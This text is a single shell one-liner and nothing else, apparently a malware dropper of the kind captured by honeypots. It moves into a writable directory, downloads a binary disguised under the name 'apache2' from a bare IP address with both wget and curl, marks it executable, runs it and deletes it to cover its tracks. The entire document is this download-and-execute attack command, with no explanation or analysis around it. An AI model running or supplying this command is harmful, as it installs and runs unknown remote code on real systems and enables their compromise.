cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://149.56.13.32/apache2; curl -O http://149.56.13.32/apache2; chmod +x apache2; ./apache2; rm -rf apache2
